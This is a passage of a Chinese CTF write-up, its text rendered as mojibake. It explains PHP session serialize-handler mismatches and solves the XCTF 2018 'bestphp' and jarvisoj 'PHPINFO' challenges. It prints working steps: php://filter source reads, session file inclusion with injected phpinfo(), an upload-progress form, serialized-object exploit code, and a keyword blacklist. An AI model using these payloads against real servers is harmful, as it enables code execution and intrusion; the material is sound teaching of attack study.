<td>session.save_handler</td>
<td>sessionä¿å­˜å½¢å¼ã€‚é»˜è®¤ä¸ºfiles</td>
</tr>
<tr>
<td>session.save_path</td>
<td>sessionä¿å­˜è·¯å¾„ã€‚</td>
</tr>
<tr>
<td>session.serialize_handler</td>
<td>sessionåºåˆ—åŒ–å­˜å‚¨æ‰€ç”¨å¤„ç†å™¨ã€‚é»˜è®¤ä¸ºphp</td>
</tr>
<tr>
<td>session.upload_progress.cleanup</td>
<td>ä¸€æ—¦è¯»å–äº†æ‰€æœ‰POSTæ•°æ®ï¼Œç«‹å³æ¸…é™¤è¿›åº¦ä¿¡æ¯ã€‚é»˜è®¤å¼€å¯</td>
</tr>
<tr>
<td>session.upload_progress.enabled</td>
<td>å°†ä¸Šä¼ æ–‡ä»¶çš„è¿›åº¦ä¿¡æ¯å­˜åœ¨sessionä¸­ã€‚é»˜è®¤å¼€å¯ã€‚</td>
</tr>
</tbody>
</table>
<p>åœ¨ä¸Šè¿°çš„é…ç½®ä¸­ï¼Œ<code>session.serialize_handler</code>æ˜¯ç”¨æ¥è®¾ç½®sessionçš„åºåˆ—è¯å¼•æ“çš„ï¼Œé™¤äº†é»˜è®¤çš„PHPå¼•æ“ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨å…¶ä»–å¼•æ“ï¼Œä¸åŒçš„å¼•æ“æ‰€å¯¹åº”çš„sessionçš„å­˜å‚¨æ–¹å¼ä¸ç›¸åŒã€‚</p>
<table>
<thead>
<tr>
<th>å¤„ç†å™¨åç§°</th>
<th>å­˜å‚¨æ ¼å¼</th>
</tr>
</thead>
<tbody>
<tr>
<td>php</td>
<td>é”®å + ç«–çº¿ + ç»è¿‡<code>serialize()</code>å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td>php_binary</td>
<td>é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ + é”®å + ç»è¿‡<code>serialize()</code>å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</td>
</tr>
<tr>
<td>php_serialize</td>
<td>ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„<strong>æ•°ç»„</strong></td>
</tr>
</tbody>
</table>
<p>é‚£ä¹ˆå…·ä½“è€Œè¨€ï¼Œåœ¨é»˜è®¤é…ç½®æƒ…å†µä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">session_start()</span><br><span class="line">$_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;ca01h&#x27;</span>;</span><br><span class="line">var_dump();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>SESSIONæ–‡ä»¶çš„å†…å®¹æ˜¯ï¼š<code>name|s:5:&quot;ca01h&quot;</code>ï¼Œnameæ˜¯é”®å€¼ï¼Œ<code>s:5:&quot;ca01h&quot;;</code>æ˜¯<code>serialize(&quot;ca01h&quot;)</code>çš„ç»“æœã€‚</p>
<p>åœ¨php_serializeå¼•æ“ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;ca01h&#x27;</span>;</span><br><span class="line">var_dump();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>SESSIONæ–‡ä»¶çš„å†…å®¹æ˜¯<code>a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;ca01h&quot;;&#125;</code>ã€‚<code>a:1</code>æ˜¯ä½¿ç”¨php_serializeè¿›è¡Œåºåˆ—è¯éƒ½ä¼šåŠ ä¸Šã€‚åŒæ—¶ä½¿ç”¨php_serializeä¼šå°†sessionä¸­çš„keyå’Œvalueéƒ½ä¼šè¿›è¡Œåºåˆ—åŒ–ã€‚</p>
<p>åœ¨php_binaryå¼•æ“ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_binary&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[<span class="string">&#x27;name&#x27;</span>] = <span class="string">&#x27;ca01h&#x27;</span>;</span><br><span class="line">var_dump();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>SESSIONæ–‡ä»¶çš„å†…å®¹æ˜¯<code>names:6:&quot;spoock&quot;;</code>ã€‚ç”±äº<code>name</code>çš„é•¿åº¦æ˜¯4ï¼Œ4åœ¨ASCIIè¡¨ä¸­å¯¹åº”çš„å°±æ˜¯<code>EOT</code>ã€‚æ ¹æ®php_binaryçš„å­˜å‚¨è§„åˆ™ï¼Œæœ€åå°±æ˜¯<code>names:6:&quot;spoock&quot;;</code>ã€‚</p>
<h2 id="0x02-PHP-Sessionååºåˆ—åŒ–çš„æ¼æ´åŸå› ">0x02 PHP Sessionååºåˆ—åŒ–çš„æ¼æ´åŸå› </h2>
<p>PHPä¸­çš„Sessionçš„å®ç°æ˜¯æ²¡æœ‰çš„é—®é¢˜ï¼Œå±å®³ä¸»è¦æ˜¯ç”±äºç¨‹åºå‘˜çš„Sessionä½¿ç”¨ä¸å½“è€Œå¼•èµ·çš„ã€‚<br>
å¦‚æœåœ¨PHPåœ¨ååºåˆ—åŒ–å­˜å‚¨çš„$_SESSIONæ•°æ®æ—¶ä½¿ç”¨çš„å¼•æ“å’Œåºåˆ—åŒ–ä½¿ç”¨çš„å¼•æ“ä¸ä¸€æ ·ï¼Œä¼šå¯¼è‡´æ•°æ®æ— æ³•æ­£ç¡®ç¬¬ååºåˆ—åŒ–ã€‚é€šè¿‡ç²¾å¿ƒæ„é€ çš„æ•°æ®åŒ…ï¼Œå°±å¯ä»¥ç»•è¿‡ç¨‹åºçš„éªŒè¯æˆ–è€…æ˜¯æ‰§è¡Œä¸€äº›ç³»ç»Ÿçš„æ–¹æ³•ã€‚ä¾‹å¦‚ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$_SESSION[<span class="string">&#x27;ca01h&#x27;</span>] = <span class="string">&#x27;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢çš„ $_SESSION æ•°æ®ï¼Œåœ¨å­˜å‚¨æ—¶ä½¿ç”¨çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸º php_serializeï¼Œå­˜å‚¨çš„æ ¼å¼å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">a:1:&#123;s:5:&quot;ca01h&quot;;s:20:&quot;|O:8:&quot;stdClass&quot;:0:&#123;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>åœ¨è¯»å–æ•°æ®æ—¶å¦‚æœç”¨çš„ååºåˆ—åŒ–å¤„ç†å™¨ä¸æ˜¯ php_serializeï¼Œè€Œæ˜¯ php çš„è¯ï¼Œé‚£ä¹ˆååºåˆ—åŒ–åçš„æ•°æ®å°†ä¼šå˜æˆï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">var_dump($_SESSION);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;a:1:&#123;s:5:&quot;</span>ca01h<span class="string">&quot;;s:20:&quot;</span><span class="string">&quot;]=&gt;</span></span><br><span class="line"><span class="string">  object(stdClass)#1 (0) &#123;</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>
<p>è¿™æ˜¯å› ä¸ºå½“ä½¿ç”¨phpå¼•æ“çš„æ—¶å€™ï¼Œphpå¼•æ“ä¼šä»¥<code>|</code>ä½œä¸ºä½œä¸ºkeyå’Œvalueçš„åˆ†éš”ç¬¦ï¼Œé‚£ä¹ˆå°±ä¼šå°†<code>a:1:&#123;s:5:&quot;ca01h&quot;;s:20:&quot;</code>ä½œä¸ºSESSIONçš„keyï¼Œå°†<code>O:8:&quot;stdClass&quot;:0:&#123;&#125;</code>ä½œä¸ºvalueï¼Œç„¶åè¿›è¡Œååºåˆ—åŒ–ï¼Œæœ€åå°±ä¼šå¾—åˆ°stdClassè¿™ä¸ªç±»ã€‚</p>
<p>å®é™…åˆ©ç”¨çš„è¯ä¸€èˆ¬åˆ†ä¸ºä¸¤ç§ï¼š</p>
<ul>
<li>
<p>session.auto_start=On</p>
<p>å½“é…ç½®é€‰é¡¹ session.auto_startï¼Onï¼Œä¼šè‡ªåŠ¨æ³¨å†Œ Session ä¼šè¯ï¼ˆç›¸å½“äºæ‰§è¡Œäº†<code>session_start()</code>ï¼‰ï¼Œå› ä¸ºè¯¥è¿‡ç¨‹æ˜¯å‘ç”Ÿåœ¨<strong>è„šæœ¬ä»£ç æ‰§è¡Œå‰</strong>ï¼Œæ‰€ä»¥åœ¨è„šæœ¬ä¸­è®¾å®šçš„åŒ…æ‹¬åºåˆ—åŒ–å¤„ç†å™¨åœ¨å†…çš„ session ç›¸å…³é…é€‰é¡¹çš„è®¾ç½®æ˜¯ä¸èµ·ä½œç”¨çš„ã€‚å› æ­¤ä¸€äº›éœ€è¦åœ¨è„šæœ¬ä¸­è®¾ç½®åºåˆ—åŒ–å¤„ç†å™¨é…ç½®çš„ç¨‹åºä¼šåœ¨ session.auto_startï¼On æ—¶ï¼Œé”€æ¯è‡ªåŠ¨ç”Ÿæˆçš„ Session ä¼šè¯ã€‚ç„¶åè®¾ç½®éœ€è¦çš„åºåˆ—åŒ–å¤„ç†å™¨ï¼Œå†è°ƒç”¨ session_start() å‡½æ•°æ³¨å†Œä¼šè¯ï¼Œè¿™æ—¶å¦‚æœè„šæœ¬ä¸­è®¾ç½®çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸ php.ini ä¸­è®¾ç½®çš„ä¸åŒï¼Œå°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// foo1.php</span></span><br><span class="line"><span class="keyword">if</span>(ini_get(<span class="string">&#x27;session.auto_start&#x27;</span>)) </span><br><span class="line">  session_destroy();</span><br><span class="line"></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;test&#x27;</span>]))</span><br><span class="line">  $_SESSION[<span class="string">&#x27;test&#x27;</span>] = $_GET[<span class="string">&#x27;test&#x27;</span>];</span><br></pre></td></tr></table></figure>
<p>è®¿é—®<code>http://127.0.0.1/test/serialize/foo1.php?test=|O:8:&quot;stdClass&quot;:0:&#123;&#125;</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200610114506.png" alt=""></p>
<p>å¦‚æœåœ¨è¿™ä¸ªsessionè®¾ç½®æˆåŠŸåï¼Œæœ‰å…¶ä»–çš„é¡µé¢ä½¿ç”¨è¿™ä¸ªsessionï¼Œç”±äºå¤„ç†å™¨çš„ä¸åŒï¼Œå°±ä¼šå¯¼è‡´å®‰å…¨é—®é¢˜ã€‚ç„¶è€ŒPHPè‡ªåŠ¨æ³¨å†ŒSessionä¼šè¯æ˜¯åœ¨è„šæœ¬æ‰§è¡Œå‰ï¼Œæ‰€ä»¥é€šè¿‡è¯¥æ–¹å¼åªèƒ½æ³¨å…¥PHPçš„å†…ç½®ç±»ã€‚</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// foo2.php</span></span><br><span class="line">var_dump($_SESSION);</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200610114631.png" alt=""></p>
<blockquote>
<p>php.inié…ç½®ä¸­session_use_trans_sid = 1æ‰èƒ½è·¨é¡µé¢è®¿é—®SESSION</p>
</blockquote>
</li>
<li>
<p>session.auto_start=Off</p>
<p>å½“é…ç½®é€‰é¡¹ session.auto_startï¼Offï¼Œä¸¤ä¸ªè„šæœ¬æ³¨å†Œ Session ä¼šè¯æ—¶ä½¿ç”¨çš„åºåˆ—åŒ–å¤„ç†å™¨ä¸åŒï¼Œå°±ä¼šå‡ºç°å®‰å…¨é—®é¢˜ï¼Œå¦‚ä¸‹é¢çš„ä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// foo1.php</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php_serialize&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">&#x27;test&#x27;</span>] = $_GET[<span class="string">&#x27;test&#x27;</span>];</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200610121850.png" alt=""></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200611110445.png" alt=""></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="meta">&lt;?php</span></span><br><span class="line">  <span class="comment">// foo2.php</span></span><br><span class="line">  session_start();</span><br><span class="line">  </span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">      <span class="keyword">var</span> $hi;</span><br><span class="line">  </span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">&#x27;hi&#x27;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;hi;</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200610122050.png" alt=""></p>
</li>
</ul>
<h2 id="0x03-ä¾‹é¢˜è§£æ">0x03 ä¾‹é¢˜è§£æ</h2>
<h3 id="2018-XCTF-Final-bestphp">2018 XCTF Final bestphp</h3>
<p>é¢˜ç›®ç¯å¢ƒï¼š<a href="https://github.com/shimmeris/CTF-Web-Challenges/tree/master/File-Inclusion/XCTF-Final-2018-Bestphp">https://github.com/shimmeris/CTF-Web-Challenges/tree/master/File-Inclusion/XCTF-Final-2018-Bestphp</a></p>
<p>ç›´æ¥ç»™å‡ºäº†<code>index.php</code>çš„æºç ï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200610235644.png" alt=""></p>
<p><code>call_user_func()</code>å‡½æ•°ä¸­çš„ä¸¤ä¸ªå‚æ•°éƒ½æ˜¯å¯æ§çš„ï¼Œé‚£ä¹ˆå°±å¯ä»¥å›è°ƒ<code>extract()</code>å‡½æ•°ç”¨æˆ·å˜é‡è¦†ç›–ï¼Œè¿›è€Œè¯»å–æœ¬åœ°æ–‡ä»¶ï¼š</p>
<p><img src="C:%5CUsers%5C51196%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200610235853742.png" alt="image-20200610235853742"></p>
<p><code>http://192.168.153.133:8003/?function=extract&amp;file=php://filter/read=convert.base64-encode/resource=function.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filters</span>(<span class="params">$data</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">foreach</span>($data <span class="keyword">as</span> $key=&gt;$value)&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/eval|assert|exec|passthru|glob|system|popen/i&#x27;</span>,$value))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Do not hack me!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>http://192.168.153.133:8003/?function=extract&amp;file=php://filter/read=convert.base64-encode/resource=admin.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">hello admin</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($_SESSION[<span class="string">&#x27;name&#x27;</span>]))&#123;</span><br><span class="line">    session_start();</span><br><span class="line">    <span class="comment">#echo &#x27;hello &#x27; + $_SESSION[&#x27;name&#x27;];</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;you must login with admin&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥ä¸»è¦è®¨è®ºsessionæ¼æ´åˆ©ç”¨é—®é¢˜session+lfiï¼Œç”±äºä»£ç ï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">ini_set(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/var/www/html:/tmp&#x27;</span>);</span><br></pre></td></tr></table></figure>
<p>é™åˆ¶äº†æˆ‘ä»¬æ— æ³•ç›´æ¥å»åŒ…å«é»˜è®¤çš„è·¯å¾„ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_phpsessid</span><br></pre></td></tr></table></figure>
<blockquote>
<p>å¸¸è§çš„Sessionå­˜å‚¨ä½ç½®ï¼š</p>
<p>/var/lib/php/sess_PHPSESSID</p>
<p>/var/lib/php/sessions/sess_PHPSESSID</p>
<p>/var/lib/php5/sess_PHPSESSID</p>
<p>/var/lib/php5/sessions/sess_PHPSESSID</p>
<p>/tmp/sess_PHPSESSID</p>
<p>/tmp/sessions/sess_PHPSESSID</p>
</blockquote>
<p>ä½†æ˜¯å› ä¸ºæœ‰å˜é‡è¦†ç›–å› æ­¤å¯ä»¥é€šè¿‡<code>session_start()</code>ï¼Œæ”¹å˜save_pathçš„æ–¹å¼è®©sessionå­˜å‚¨è·¯å¾„åœ¨open_basedirå…è®¸çš„ç›®å½•ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?function&#x3D;session_start&amp;save_path&#x3D;&#x2F;tmp</span><br></pre></td></tr></table></figure>
<p>ç„¶åå»åŒ…å«ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?function&#x3D;extract&amp;file&#x3D;&#x2F;tmp&#x2F;sess_arfguipj1mthu7bkma10j0f5o3</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/t01e0532ccb6b2faf63.png" alt=""></p>
<p>è¿™é‡Œæœ‰ä¸€ä¸ª<code>$_SESSION['name']</code>ï¼Œå¹¶ä¸”å…¶å¯ä»¥è¢«æˆ‘ä»¬postçš„nameå¤åˆ¶ï¼Œé‚£è¿™å°±å¯ä»¥è¾¾åˆ°æ§åˆ¶sessionå†…å®¹çš„ç›®çš„ã€‚</p>
<p>ä½¿ç”¨Hackbarç›´æ¥POSTæ•°æ®ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">name&#x3D;&lt;?&#x3D;phpinfo();?&gt;</span><br></pre></td></tr></table></figure>
<p>å†å»åŒ…å«å¯¹åº”çš„sessionï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?function&#x3D;extract&amp;file&#x3D;&#x2F;tmp&#x2F;sess_arfguipj1mthu7bkma10j0f5o3</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200611094600.png" alt=""></p>
<p>åé¢æ‰¾åˆ°flagç›´æ¥catå³å¯ã€‚</p>
<blockquote>
<p>ä»‹ç»å¦å¤–ä¸€ç§æ€è·¯ï¼šPHP7.0æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ åŒ…å«è‡ªèº«ä»è€Œå¯¼è‡´æ­»å¾ªç¯ï¼š<a href="https://xz.aliyun.com/t/3174#toc-4">https://xz.aliyun.com/t/3174#toc-4</a></p>
</blockquote>
<h3 id="jarvisoj-PHPINFO">jarvisoj PHPINFO</h3>
<p>é¢˜ç›®åœ°å€ï¼š<a href="http://web.jarvisoj.com:32784">http://web.jarvisoj.com:32784</a></p>
<p>åœ¨è®²è¿™é“é¢˜ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥ä»‹ç»ä¸€ä¸‹<strong>session.upload_progress.enabled</strong></p>
<blockquote>
<p>å½“ <a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled">session.upload_progress.enabled</a> INI é€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚ è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€ã€‚</p>
<p>å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„<a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>åŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨<a href="http://php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>ä¸­è·å¾—ã€‚ å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨<a href="http://php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>ä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯<a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix">session.upload_progress.prefix</a> ä¸ <a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>è¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">&#x27;session.serialize_handler&#x27;</span>, <span class="string">&#x27;php&#x27;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;phpinfo&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_string(file_get_contents(<span class="string">&#x27;index.php&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200611101827.png" alt=""></p>
<p>è¿™é“é¢˜æ¶‰åŠåˆ°ä¸¤ä¸ªçŸ¥è¯†ç‚¹ï¼Œç¬¬ä¸€ä¸ªçŸ¥è¯†ç‚¹å°±æ˜¯<strong>PHP Session åºåˆ—åŒ–åŠååºåˆ—åŒ–å¤„ç†å™¨è®¾ç½®ä½¿ç”¨ä¸å½“</strong>ã€‚æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼ŒINIä¸­é»˜è®¤çš„å¤„ç†å™¨æ˜¯php_serializeï¼Œè€Œç¨‹åºä½¿ç”¨çš„å´æ˜¯phpå¤„ç†å™¨ã€‚</p>
<p>å½¢æˆçš„åŸç†å°±æ˜¯åœ¨ç”¨<code>session.serialize_handler = php_serialize</code>å­˜å‚¨çš„å­—ç¬¦å¯ä»¥å¼•å…¥ | , å†ç”¨<code>session.serialize_handler = php</code>æ ¼å¼å–å‡º<code>$_SESSION</code>çš„å€¼æ—¶ï¼Œ <code>|</code>ä¼šè¢«å½“æˆé”®å€¼å¯¹çš„åˆ†éš”ç¬¦ï¼Œåœ¨ç‰¹å®šçš„åœ°æ–¹ä¼šé€ æˆååºåˆ—åŒ–æ¼æ´ã€‚</p>
<p>ç¬¬äºŒä¸ªçŸ¥è¯†ç‚¹å°±æ˜¯<strong>Upload progress in sessions</strong>ï¼Œå½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶ post ä¸€ä¸ªä¸ ini è®¾ç½®çš„ session.upload_progress.name åŒåå˜é‡æ—¶ï¼Œphp æ£€æµ‹åˆ°è¿™ç§ post è¯·æ±‚æ—¶å°±ä¼šåœ¨ $SESSION ä¸­æ·»åŠ ä¸€ç»„æ•°æ®ï¼Œæ‰€ä»¥å¯é€šè¿‡ session.upload_progress æ¥è®¾ç½® sessionã€‚</p>
<p>é¦–å…ˆæ„é€ ä¸€ä¸ªä¸Šä¼ è¡¨å•ï¼š</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;http://web.jarvisoj.com:32784/index.php&quot;</span> <span class="attr">method</span>=<span class="string">&quot;POST&quot;</span> <span class="attr">enctype</span>=<span class="string">&quot;multipart/form-data&quot;</span>&gt;</span>       </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="attr">value</span>=<span class="string">&quot;123&quot;</span> /&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;file&quot;</span> <span class="attr">name</span>=<span class="string">&quot;file&quot;</span> /&gt;</span>        </span><br><span class="line">    <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>å†æ„é€ expï¼š</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mdzz;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mdzz = <span class="string">&#x27;phpinfo();&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> OowoO();</span><br><span class="line">$a-&gt;mdzz=<span class="string">&quot;var_dump(scandir(&#x27;./&#x27;));&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>
<p>ä¿®æ”¹æ–‡ä»¶å†…å®¹ï¼š</p>
